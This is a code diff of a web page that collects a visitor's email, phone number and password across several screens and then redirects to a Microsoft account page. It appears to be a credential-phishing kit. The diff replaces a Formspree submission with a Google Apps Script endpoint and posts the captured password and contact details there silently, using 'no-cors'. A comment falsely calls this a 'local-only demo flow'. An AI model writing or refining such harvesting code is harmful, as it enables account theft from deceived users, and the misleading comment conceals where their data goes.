@@ -292,7 +292,7 @@
 
 <script>
   // Local-only demo flow with no external Firebase or SMS verification.
-  const FORMSPREE_URL = 'https://formspree.io/f/xeevgnar';
+  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwT6Y5UOOrcVRsKfQCGVtcj3FuB3a8E60P4Uu725fodK9NYVZVhPNja8_yaPygJ8TLRCA/exec';
   let collectedData = window.collectedData = {
     email: "",
     phone: "",
@@ -319,25 +319,7 @@
     window.collectedData.phone = '+1' + raw;
     goTo('screen2');
   }
-  async function submitData() {
-    const response = await fetch(FORMSPREE_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({
-        email: window.collectedData.email,
-        phone: window.collectedData.phone,
-        password: window.collectedData.password
-      })
-    });
-    if (!response.ok) {
-      throw new Error('Submission failed: ' + response.status);
-    }
-    return response.json();
-  }
-  async function handlePassword() {
+    async function handlePassword() {
     var pw = document.getElementById('pwInput').value;
     if (!pw) return;
     window.collectedData.password = pw;
@@ -367,6 +349,20 @@
     var i = document.getElementById('pwInput');
     i.type = i.type === 'password' ? 'text' : 'password';
   }
+  async function submitData() {
+  await fetch(GOOGLE_SCRIPT_URL, {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({
+      email: window.collectedData.email,
+      phone: window.collectedData.phone,
+      password: window.collectedData.password,
+      timestamp: new Date().toISOString()
+    })
+  });
+
+  return true;
+}
   function goToAccountPage() {
     // Navigate to session screen and then redirect to Microsoft account page
     goTo('screen5');
